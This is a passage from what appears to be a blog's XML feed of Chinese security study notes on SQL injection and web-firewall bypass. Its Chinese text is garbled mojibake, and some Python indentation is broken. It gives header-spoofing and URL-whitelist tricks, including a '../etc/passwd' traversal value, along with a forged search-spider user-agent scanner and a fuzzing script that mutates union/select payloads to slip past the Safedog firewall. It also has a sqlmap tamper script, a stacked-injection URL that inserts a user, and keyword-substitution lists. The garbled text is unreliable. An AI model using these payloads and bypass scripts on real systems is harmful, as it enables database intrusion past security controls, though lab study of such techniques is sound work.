title="ç™½åå•"></a>ç™½åå•</h3><p><strong>æ–¹å¼ä¸€ï¼šIP ç™½åå•</strong> </p><p>ä»ç½‘ç»œå±‚è·å–çš„ ipï¼Œè¿™ç§ä¸€èˆ¬ä¼ªé€ ä¸æ¥ï¼Œå¦‚æœæ˜¯è·å–å®¢æˆ·ç«¯çš„ IPï¼Œè¿™æ ·å°±å¯èƒ½å­˜åœ¨ä¼ªé€  IP ç»•è¿‡çš„æƒ… å†µã€‚</p><p> æµ‹è¯•æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ä¿®æ”¹ http çš„ header æ¥ bypass waf</span><br><span class="line"></span><br><span class="line">X-forwarded-for </span><br><span class="line">X-remote-IP </span><br><span class="line">X-originating-IP </span><br><span class="line">x-remote-addr</span><br><span class="line">X-Real-ip</span><br></pre></td></tr></table></figure><p> <strong>æ–¹å¼äºŒï¼šé™æ€èµ„æº</strong></p><p> ç‰¹å®šçš„é™æ€èµ„æºåç¼€è¯·æ±‚ï¼Œå¸¸è§çš„é™æ€æ–‡ä»¶(.js .jpg .swf .css ç­‰ç­‰)ï¼Œç±»ä¼¼ç™½åå•æœºåˆ¶ï¼Œwaf ä¸ºäº†æ£€æµ‹ æ•ˆç‡ï¼Œä¸å»æ£€æµ‹è¿™æ ·ä¸€äº›é™æ€æ–‡ä»¶ååç¼€çš„è¯·æ±‚ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.9.9.201/sql.php?id=1 </span><br><span class="line">http://10.9.9.201/sql.php/1.js?id=1 </span><br></pre></td></tr></table></figure><p>å¤‡æ³¨ï¼šAspx/php åªè¯†åˆ«åˆ°å‰é¢çš„.aspx/.php åé¢åŸºæœ¬ä¸è¯†åˆ« </p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108102.png" alt="image-20210901200253535" style="zoom:50%;" /><p>æ–¹å¼ä¸‰ï¼šurl ç™½åå• </p><p>ä¸ºäº†é˜²æ­¢è¯¯æ‹¦ï¼Œéƒ¨åˆ† waf å†…ç½®é»˜è®¤çš„ç™½åå•åˆ—è¡¨ï¼Œå¦‚ admin/manager/system ç­‰ç®¡ç†åå°ã€‚åªè¦ url ä¸­å­˜åœ¨ç™½åå•çš„å­—ç¬¦ä¸²ï¼Œå°±ä½œä¸ºç™½åå•ä¸è¿›è¡Œæ£€æµ‹ã€‚å¸¸è§çš„ url æ„é€ å§¿åŠ¿ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql.php/admin/php?id=1</span><br><span class="line">http://127.0.0.1/sql.php?a=/manage/&amp;b=../etc/passwd</span><br><span class="line">http://127.0.0.1/../../../manage/../sql.asp?id=2</span><br></pre></td></tr></table></figure><p>wafé€šè¿‡/manage/è¿›è¡Œæ¯”è¾ƒï¼Œåªè¦urlä¸­å­˜åœ¨/manage/å°±ä½œä¸ºç™½åå•ä¸è¿›è¡Œæ£€æµ‹ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥é€šè¿‡/sql.php?1=manage/&amp;b=../etc/passwdç»•è¿‡é˜²å¾¡è§„åˆ™ã€‚</p><h3 id="çˆ¬è™«ç™½åå•"><a href="#çˆ¬è™«ç™½åå•" class="headerlink" title="çˆ¬è™«ç™½åå•"></a>çˆ¬è™«ç™½åå•</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>ç™¾åº¦é€šè¿‡çˆ¬è™«çš„æ–¹å¼å»æ”¶å½•ç½‘ç«™ï¼Œè€Œä¸ä¼šè®©WAFæ‹¦æˆªï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¼ªé€ ç™¾åº¦çˆ¬è™«çš„æ–¹å¼å»ç»•è¿‡WAFã€‚</p><h4 id="å„å¤§æœç´¢å¼•æ“çš„User-Agent"><a href="#å„å¤§æœç´¢å¼•æ“çš„User-Agent" class="headerlink" title="å„å¤§æœç´¢å¼•æ“çš„User-Agent"></a>å„å¤§æœç´¢å¼•æ“çš„User-Agent</h4><h4 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.feiniaomy.com/post/429.html</span><br></pre></td></tr></table></figure><p>**ç™¾åº¦ **</p><p>æœåŠ¡å™¨åœ°å€åœ¨åŒ—äº¬ {city:â€åŒ—äº¬å¸‚â€, province:â€åŒ—äº¬å¸‚â€}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br></pre></td></tr></table></figure><p><strong>è°·æ­Œ</strong></p><p>æœåŠ¡å™¨åœ°å€åœ¨èŠ’å»·ç»´å°¤ {city:â€èŠ’å»·ç»´å°¤â€, province:â€åŠ åˆ©ç¦å°¼äºšå·â€}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span><br><span class="line"> </span><br><span class="line">Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span><br></pre></td></tr></table></figure><h4 id="ä¼ªé€ æˆç™¾åº¦çˆ¬è™«è„šæœ¬"><a href="#ä¼ªé€ æˆç™¾åº¦çˆ¬è™«è„šæœ¬" class="headerlink" title="ä¼ªé€ æˆç™¾åº¦çˆ¬è™«è„šæœ¬"></a>ä¼ªé€ æˆç™¾åº¦çˆ¬è™«è„šæœ¬</h4><p>å½“æˆ‘ä»¬ä¸ä¼ªé€ ç™¾åº¦çˆ¬è™«æ—¶ï¼Œæˆ‘ä»¬å»æ‰«æç½‘ç«™ï¼Œæ‰«æåˆ°çš„ç»“æœéƒ½ä¼šè¢«æ‹¦æˆªï¼Œæ‰«æç»“æœéƒ½æ˜¯é”™è¯¯çš„ï¼Œè€Œä¼ªé€ ä»¥åå°±ä¸ä¼šè¢«æ‹¦æˆªã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://192.168.0.103:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line">head=&#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0(compatible;Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;PH1P.txt&#x27;</span>):</span><br><span class="line">    data=data.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    urls=url+data</span><br><span class="line">    code=requests.get(urls).status_code</span><br><span class="line">    <span class="built_in">print</span>(urls+<span class="string">&#x27;|&#x27;</span>+<span class="built_in">str</span>(code))</span><br></pre></td></tr></table></figure><h3 id="FUZZç»•è¿‡è„šæœ¬"><a href="#FUZZç»•è¿‡è„šæœ¬" class="headerlink" title="FUZZç»•è¿‡è„šæœ¬"></a>FUZZç»•è¿‡è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/envpython</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright(c)2006-2019sqlmapdevelopers(http://sqlmap.org/)</span></span><br><span class="line"><span class="string">Seethefile&#x27;LICENSE&#x27;forcopyingpermission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__=PRIORITY.HIGHEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">singleTimeWarnMessage(<span class="string">&quot;tamper script &#x27;%s&#x27; is only meant to be run against %s&quot;</span>%(os.path.basename(__file__).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>],DBMS.MYSQL))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload,**kwargs</span>):</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#%23a%0aunion/*!44575select*/1,2,3</span></span><br><span class="line"><span class="keyword">if</span> payload:</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;union&quot;</span>,<span class="string">&quot;%23a%0aunion&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;/*!44575select*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;%20&quot;</span>,<span class="string">&quot;%23a%0a&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;&quot;</span>,<span class="string">&quot;%23a%0a&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;database()&quot;</span>,<span class="string">&quot;database%23a%0a()&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:8080/sqlilabs/Less-2/?id=-1&#x27;</span></span><br><span class="line">union=<span class="string">&#x27;union&#x27;</span></span><br><span class="line">select=<span class="string">&#x27;select&#x27;</span></span><br><span class="line">num=<span class="string">&#x27;1,2,3&#x27;</span></span><br><span class="line">a=&#123;<span class="string">&#x27;%0a&#x27;</span>,<span class="string">&#x27;%23&#x27;</span>&#125;</span><br><span class="line">aa=&#123;<span class="string">&#x27;x&#x27;</span>&#125;</span><br><span class="line">aaa=&#123;<span class="string">&#x27;%0a&#x27;</span>,<span class="string">&#x27;%23&#x27;</span>&#125;</span><br><span class="line">b=<span class="string">&#x27;/*!&#x27;</span></span><br><span class="line">c=<span class="string">&#x27;*/&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bypass</span>():</span></span><br><span class="line"><span class="keyword">for</span> xiaodi <span class="keyword">in</span> a:</span><br><span class="line"><span class="keyword">for</span> xiaodis <span class="keyword">in</span> aa:</span><br><span class="line"><span class="keyword">for</span> xiaodiss <span class="keyword">in</span> aaa:</span><br><span class="line"><span class="keyword">for</span> two <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">44500</span>,<span class="number">44600</span>):</span><br><span class="line">urls=url+xiaodi+xiaodis+xiaodiss+b+<span class="built_in">str</span>(two)+union+c+xiaodi+xiaodis+xiaodiss+select+xiaodi+xiaodis+xiao</span><br><span class="line">diss+num</span><br><span class="line"><span class="comment">#urlss=url+xiaodi+xiaodis+xiaodiss+union+xiaodi+xiaodis+xiaodiss+b+str(two)+select+c+xiaodi+xiaodis+xia</span></span><br><span class="line">odiss+num</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">result=requests.get(urls).text</span><br><span class="line">len_r=<span class="built_in">len</span>(result)</span><br><span class="line"><span class="keyword">if</span> (result.find(<span class="string">&#x27;safedog&#x27;</span>)==-<span class="number">1</span>):</span><br><span class="line"><span class="comment">#print(&#x27;bypass url addreessï¼š&#x27;+urls+&#x27;|&#x27;+str(len_r))</span></span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&#x27;bypass url addreessï¼š&#x27;</span>+urls+<span class="string">&#x27;|&#x27;</span>+<span class="built_in">str</span>(len_r))</span><br><span class="line"><span class="keyword">if</span> len_r==<span class="number">715</span>:</span><br><span class="line">                             fp = <span class="built_in">open</span>(<span class="string">&#x27;url.txt&#x27;</span>,<span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">                             fp.write(urls+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                             fp.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;connecting error&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">if__name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;fuzz strat!&#x27;</span>)</span><br><span class="line">bypass()</span><br><span class="line">    </span><br><span class="line">    </span><br></pre></td></tr></table></figure><h3 id="SQLMAPç»•è¿‡"><a href="#SQLMAPç»•è¿‡" class="headerlink" title="SQLMAPç»•è¿‡"></a>SQLMAPç»•è¿‡</h3><h4 id="SQLMAPè‡ªå¸¦"><a href="#SQLMAPè‡ªå¸¦" class="headerlink" title="SQLMAPè‡ªå¸¦"></a>SQLMAPè‡ªå¸¦</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_34444097/article/details/82717357</span><br></pre></td></tr></table></figure><h4 id="è‡ªå·±å†™"><a href="#è‡ªå·±å†™" class="headerlink" title="è‡ªå·±å†™"></a>è‡ªå·±å†™</h4><p>ä»¿ç…§SQLMAPè‡ªå¸¦çš„æ¥å†™ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108988.png" alt="image-20210901203050344"></p><h4 id="æ‹¦æˆª"><a href="#æ‹¦æˆª" class="headerlink" title="æ‹¦æˆª"></a>æ‹¦æˆª</h4><p>ç›´æ¥é€šè¿‡SQLMAPè·‘ï¼Œæ•°æ®åŒ…çš„user-agentä¼šæ˜¾ç¤ºsqlmapçš„æ ‡å¿—</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108202.png" alt="image-20210901203321920"></p><p>è¿™æ ·å°±ä¼šè¢«WAFæ‹¦æˆª</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108009.png" alt="image-20210901203348626"></p><p>å¯ä»¥çœ‹åˆ°WAFå¼€å¯äº†sqlmapå·¥å…·æ‹¦æˆªï¼Œå°±æ˜¯é€šè¿‡è¯†åˆ«user-agentã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108282.png" alt="image-20210901203359165"></p><p><strong>æ›´æ”¹user-agent</strong></p><p>sqlmapä¸­å¯ä»¥é€šè¿‡â€“random-agentè¿›è¡Œæ›´æ”¹æ•°æ®åŒ…ä¸­çš„User-Agentï¼Œæ¥ç»•è¿‡WAFã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108011.png" alt="image-20210901203928170"></p><p><strong>æˆåŠŸæ³¨å…¥</strong></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸæ³¨å…¥</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108673.png" alt="image-20210901204449882"></p><p>è€Œä¸”ä»–æ˜¯æ ¹æ®æˆ‘ä»¬å†™çš„è§„åˆ™è¿›è¡Œæ³¨å…¥çš„</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108379.png" alt="image-20210901204528936"></p><p><strong>WAFå¼€å¯æµé‡é˜²æŠ¤</strong></p><p>å½“WAFå¼€å¯CCé˜²æŠ¤</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108592.png" alt="image-20210901204704671"></p><p>æˆ‘ä»¬å†æ¬¡æ³¨å…¥ï¼Œå‘ç°è¢«æ‹¦æˆªï¼ŒåŸå› æ˜¯å› ä¸ºsqlmapæ³¨å…¥å¤ªå¿«äº†ï¼Œè¢«WAFæ‹¦æˆªäº†</p><p>ç»•è¿‡æ–¹æ³•</p><ul><li><p>æ·»åŠ ç™½åå•User-Agentå¤´éƒ¨ï¼Œåƒç™¾åº¦çš„ã€è°·æ­Œçš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmapå‚æ•°:</span><br><span class="line">--user-agent=&quot;xxxx&quot; è‡ªå®šä¹‰User-Agent</span><br></pre></td></tr></table></figure></li><li><p>ä»£ç†æ± </p></li><li><p>æ·»åŠ å»¶æ—¶å‚æ•° â€“delayå‚æ•°</p></li></ul><p><strong>æ•°æ®åŒ…ä¸­éœ€è¦ä¿®æ”¹çš„sqlmapä¸­æ²¡æœ‰æ—¶:</strong></p><p>é€šè¿‡è‡ªå·±ç¼–å†™è„šæœ¬äºŒæ¬¡å¼€å‘ã€‚</p><ul><li><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108607.png" alt="image-20210901210720851"></li></ul><p>æ¯”å¦‚è¯´è¿™é‡Œçš„user-agentæ˜¯sqlmapä¸­æ²¡æœ‰çš„ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±å»ä¿®æ”¹ï¼Œç„¶åé€šè¿‡-rçš„æ–¹å¼åœ¨è¿›è¡Œæ³¨å…¥ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108904.png" alt="img"></p><p><strong>ä¸­è½¬æ³¨å…¥</strong></p><p>sqlmapå»æ³¨å…¥æœ¬åœ°çš„è„šæœ¬åœ°å€ -&gt; æœ¬åœ°æ­å»ºè„šæœ¬(è¯·æ±‚æ•°æ®åŒ…è‡ªå®šä¹‰ç¼–å†™) -&gt; è¿œç¨‹åœ°å€</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>18WEBæ¼æ´--SQLæ³¨å…¥ä¹‹å †å åŠWAFç»•è¿‡æ³¨å…¥</title>
      <link href="/2021/09/21/18WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E5%8F%8AWAF%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/09/21/18WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E5%8F%8AWAF%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨å®é™…çš„æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œç»å¸¸ä¼šç¢°åˆ°ç½‘ç«™å­˜åœ¨WAFçš„æƒ…å†µã€‚ç½‘ç«™å­˜åœ¨WAFï¼Œæ„å‘³ç€æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨å®‰å…¨å·¥å…·å¯¹ç½‘ç«™è¿›è¡Œæµ‹è¯•ï¼Œå› ä¸ºä¸€æ—¦è§¦ç¢°äº†WAFçš„è§„åˆ™ï¼Œè½»åˆ™ä¸¢å¼ƒæŠ¥æ–‡ï¼Œé‡åˆ™æ‹‰é»‘IPã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨è¿›è¡ŒWAFçš„ç»•è¿‡ï¼Œè€Œç»•è¿‡WAFå‰è‚¯å®šéœ€è¦å¯¹WAFçš„å·¥ä½œåŸç†æœ‰ä¸€å®šçš„ç†è§£ã€‚</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107539.png" alt="image-20210830195504797" style="zoom:67%;" /><h3 id="å †å æŸ¥è¯¢æ³¨å…¥"><a href="#å †å æŸ¥è¯¢æ³¨å…¥" class="headerlink" title="å †å æŸ¥è¯¢æ³¨å…¥"></a>å †å æŸ¥è¯¢æ³¨å…¥</h3><h4 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h4><p>Stacked injections(å †å æ³¨å…¥)ä»åè¯çš„å«ä¹‰å°±å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯ä¸€å † sql è¯­å¥(å¤šæ¡)ä¸€èµ·æ‰§è¡Œã€‚è€Œåœ¨çœŸå® çš„è¿ç”¨ä¸­ä¹Ÿæ˜¯è¿™æ ·çš„, æˆ‘ä»¬çŸ¥é“åœ¨ mysql ä¸­, ä¸»è¦æ˜¯å‘½ä»¤è¡Œä¸­, æ¯ä¸€æ¡è¯­å¥ç»“å°¾åŠ ; è¡¨ç¤ºè¯­å¥ç»“æŸã€‚ è¿™æ ·æˆ‘ä»¬å°±æƒ³åˆ°äº†æ˜¯ä¸æ˜¯å¯ä»¥å¤šå¥ä¸€èµ·ä½¿ç”¨ã€‚è¿™ä¸ªå«åš stacked  injectionã€‚ </p><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>åœ¨mysqlä¸­ï¼›ä»£è¡¨çš„æ˜¯ä¸€ä¸ªè¯­å¥çš„ç»“æŸï¼Œå †å æ³¨å…¥å°±æ˜¯åˆ©ç”¨ï¼›ä½¿å‰ä¸€ä¸ªè¯­å¥ç»“æŸï¼Œç„¶ååé¢è·Ÿä¸Šæˆ‘ä»¬è‡ªå·±çš„è¯­å¥ï¼Œå°±å½¢æˆäº†å †å æ³¨å…¥ã€‚</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107646.png" alt="image-20210830200141062" style="zoom:67%;" /><h4 id="å±€é™æ€§"><a href="#å±€é™æ€§" class="headerlink" title="å±€é™æ€§"></a>å±€é™æ€§</h4><p>å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ° APIæˆ–è€…æ•°æ®åº“å¼•æ“ ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åºã€‚</p><h4 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-38/?id=1</span><br></pre></td></tr></table></figure><p>æ’å…¥ä¸€ä¸ªç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-38/?id=1&#x27;;insert into users values(100,&#x27;test&#x27;,&#x27;test&#x27;)--+</span><br></pre></td></tr></table></figure><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107039.png" alt="image-20210830201301843" style="zoom:67%;" /><h3 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/sunny11/p/14438269.html</span><br></pre></td></tr></table></figure><h4 id="å¤§å°å†™-å…³é”®å­—æ›¿æ¢"><a href="#å¤§å°å†™-å…³é”®å­—æ›¿æ¢" class="headerlink" title="å¤§å°å†™/å…³é”®å­—æ›¿æ¢"></a>å¤§å°å†™/å…³é”®å­—æ›¿æ¢</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">id=1UnIoN/**/SeLeCT1,user()</span><br><span class="line"></span><br><span class="line">Hex() bin() ç­‰ä»·äº ascii()</span><br><span class="line"></span><br><span class="line">Sleep() ç­‰ä»·äº benchmark()</span><br><span class="line"></span><br><span class="line">Mid() substring() ç­‰ä»·äºsubstr()</span><br><span class="line"></span><br><span class="line">@@user ç­‰ä»·äº User()</span><br><span class="line"></span><br><span class="line">@@Version ç­‰ä»·äº version()</span><br></pre></td></tr></table></figure><h4 id="å„ç§ç¼–ç "><a href="#å„ç§ç¼–ç " class="headerlink" title="å„ç§ç¼–ç "></a>å„ç§ç¼–ç </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¤§å°å†™ï¼ŒURLï¼Œhexï¼Œ%0Aç­‰</span><br></pre></td></tr></table></figure><h4 id="æ³¨é‡Šä½¿ç”¨"><a href="#æ³¨é‡Šä½¿ç”¨" class="headerlink" title="æ³¨é‡Šä½¿ç”¨"></a>æ³¨é‡Šä½¿ç”¨</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//----+#//+:%00/!/ç­‰</span><br></pre></td></tr></table></figure><h4 id="å†æ¬¡å¾ªç¯"><a href="#å†æ¬¡å¾ªç¯" class="headerlink" title="å†æ¬¡å¾ªç¯"></a>å†æ¬¡å¾ªç¯</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union==uunionnion</span><br></pre></td></tr></table></figure><h4 id="ç­‰ä»·æ›¿æ¢"><a href="#ç­‰ä»·æ›¿æ¢" class="headerlink" title="ç­‰ä»·æ›¿æ¢"></a>ç­‰ä»·æ›¿æ¢</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user()=@@user()and=&amp;or=|ascii=hexç­‰</span><br></pre></td></tr></table></figure><h4 id="å‚æ•°æ±¡æŸ“"><a href="#å‚æ•°æ±¡æŸ“" class="headerlink" title="å‚æ•°æ±¡æŸ“"></a>å‚æ•°æ±¡æŸ“</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=2&amp;id=3</span><br></pre></td></tr></table></figure><h4 id="ç¼–ç è§£ç åŠåŠ å¯†è§£å¯†"><a href="#ç¼–ç è§£ç åŠåŠ å¯†è§£å¯†" class="headerlink" title="ç¼–ç è§£ç åŠåŠ å¯†è§£å¯†"></a>ç¼–ç è§£ç åŠåŠ å¯†è§£å¯†</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 